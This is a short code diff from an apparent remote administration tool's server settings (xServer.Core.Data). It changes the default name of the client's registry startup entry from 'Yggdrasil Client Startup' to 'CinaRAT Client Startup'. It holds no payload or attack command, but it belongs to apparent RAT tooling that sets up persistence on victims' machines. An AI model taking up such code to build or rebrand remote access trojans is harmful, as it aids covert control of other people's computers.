@@ -159,7 +159,7 @@ namespace xServer.Core.Data
         {
             get
             {
-                return ReadValueSafe("RegistryName", "Yggdrasil Client Startup");
+                return ReadValueSafe("RegistryName", "CinaRAT Client Startup");
             }
             set
             {
